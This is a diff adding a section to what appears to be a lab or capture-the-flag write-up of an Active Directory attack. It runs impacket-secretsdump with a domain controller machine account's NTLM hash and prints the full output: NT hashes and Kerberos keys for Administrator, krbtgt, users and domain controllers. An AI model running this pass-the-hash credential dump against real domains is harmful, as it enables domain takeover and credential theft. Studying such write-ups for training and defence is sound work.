@@ -746,11 +746,56 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 Now i have DC1 NTLM hash i can dump all the secrets
 
 ```python
+impacket-secretsdump DC1\$@dismay.hsm -hashes ':07051010977116b587c2b52b40f14ac0'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b20bd68c786d847c122ed2b1e8ab60b0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:746e5739a93cf20f26f6952227a3c321:::
+dismay.hsm\mike.silver:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+dismay.hsm\wang.kali:1109:aad3b435b51404eeaad3b435b51404ee:3c96bcb2622d45fc301fd72ba3004dd9:::
+dismay.hsm\nadia.robin:1110:aad3b435b51404eeaad3b435b51404ee:bd0ff5e06c9ccec992bb8f96d986effb:::
+dismay.hsm\jena.yamazaki:1111:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+dismay.hsm\guy.rookie:1112:aad3b435b51404eeaad3b435b51404ee:bfbb44b71a8f029be27d12097fe84d0b:::
+DC1$:1000:aad3b435b51404eeaad3b435b51404ee:07051010977116b587c2b52b40f14ac0:::
+DC2$:1114:aad3b435b51404eeaad3b435b51404ee:e4be361c7a7912da2944fe7caa6d1f5f:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:1967ef2ca07699ad25d1cd876037987e0e5afafd1d382d94d619ea42701007e4
+Administrator:aes128-cts-hmac-sha1-96:1902fb174bd31774a9fa2cf7ad9246e4
+Administrator:des-cbc-md5:f2f84f0b13a11f20
+krbtgt:aes256-cts-hmac-sha1-96:724d78f497efe782bb98bcbc274545692df9967281d81422835140e0b0e64406
+krbtgt:aes128-cts-hmac-sha1-96:5fdf66f8be1aa88afbc45f59455c285a
+krbtgt:des-cbc-md5:49c7da376e512c13
+dismay.hsm\mike.silver:aes256-cts-hmac-sha1-96:948819130ca78344d5cdabf55be7c0d6841e17ffed5173058f154267e2fd8e19
+dismay.hsm\mike.silver:aes128-cts-hmac-sha1-96:bfb1198dc5bff52f8cfab8ad42452f74
+dismay.hsm\mike.silver:des-cbc-md5:9485293eb9e07ad0
+dismay.hsm\wang.kali:aes256-cts-hmac-sha1-96:b900a1896c92240025b1ed558dc5eeb2fd42a6ef58e11d55a50a054c197dca42
+dismay.hsm\wang.kali:aes128-cts-hmac-sha1-96:f0dae3685b840c9bdaffa62a908c832a
+dismay.hsm\wang.kali:des-cbc-md5:ba0443c25e9decf8
+dismay.hsm\nadia.robin:aes256-cts-hmac-sha1-96:b8c2a01ac6a5277a997f4df80171775b6464799a8e64e04eef33fd66fd0a8064
+dismay.hsm\nadia.robin:aes128-cts-hmac-sha1-96:9d3edb3f1b741874c009adc57a6020ae
+dismay.hsm\nadia.robin:des-cbc-md5:833e83806b8c891a
+dismay.hsm\jena.yamazaki:aes256-cts-hmac-sha1-96:12bab5065ceedbc5825784eb1538f3407b1305599e269b0a09280c7c4dcb5f9d
+dismay.hsm\jena.yamazaki:aes128-cts-hmac-sha1-96:7f7ee6fcc747b91039de8d313e22ad8b
+dismay.hsm\jena.yamazaki:des-cbc-md5:7fbaf42c7a923bba
+dismay.hsm\guy.rookie:aes256-cts-hmac-sha1-96:90f2a550624cc8ea7a57b94e1de18b31cb8b9279175515415a6095a646dd4e4b
+dismay.hsm\guy.rookie:aes128-cts-hmac-sha1-96:33b5731de9e30cf521cb7e1308ef79f4
+dismay.hsm\guy.rookie:des-cbc-md5:452637490e0db53e
+DC1$:aes256-cts-hmac-sha1-96:29f0eeb1af00fb34e8fbcd30b2c0aefc41e7c37afb5dbb261de6cc7e526b0b73
+DC1$:aes128-cts-hmac-sha1-96:1b6c3770070d8e27b63dc518b1197962
+DC1$:des-cbc-md5:ecea941c51bc6143
+DC2$:aes256-cts-hmac-sha1-96:c7f89fa373667d788fdc5d5c4b4bc6d31ada340d4f495eaa03ede08496a57129
+DC2$:aes128-cts-hmac-sha1-96:a4ef6191677e28955624bbb51a656c27
+DC2$:des-cbc-md5:ea085794853da149
+[*] Cleaning up...
+```
+I can then use the hash for DC1$ and dump the contents of NTDS.dit
+
+```python
 
 ```
-
-
-
-
 
 
